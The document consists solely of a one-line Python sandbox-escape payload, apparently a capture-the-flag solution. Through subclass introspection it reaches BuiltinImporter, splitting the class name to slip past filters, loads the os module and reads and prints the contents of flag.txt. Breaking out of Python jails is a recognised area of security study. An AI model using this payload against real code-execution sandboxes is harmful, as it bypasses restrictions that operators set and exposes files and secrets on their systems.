f"{[(os:=c.load_module('os')).write(1, os.read(os.open(b'flag.txt',0),999)) for c in ().__class__.__base__.__subclasses__() if c.__name__=='BuiltinImp'+'orter']}"
